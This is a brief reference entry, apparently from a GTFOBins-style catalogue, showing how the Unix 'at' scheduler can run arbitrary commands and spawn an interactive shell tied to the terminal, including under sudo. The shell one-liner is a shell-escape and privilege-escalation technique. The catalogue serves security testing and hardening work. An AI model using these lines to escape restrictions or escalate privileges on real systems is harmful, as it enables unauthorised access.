---
type: gtfobin
name: at
platform: Unix
functions: [command, shell]
tags: [gtfobin, unix, lotl]
---

# at

## command

```bash
echo /path/to/command | at now
```
**Contexts:** sudo, unprivileged

## shell

```bash
echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null
```
_`tail` is used to pause the terminal._
**Contexts:** sudo, unprivileged
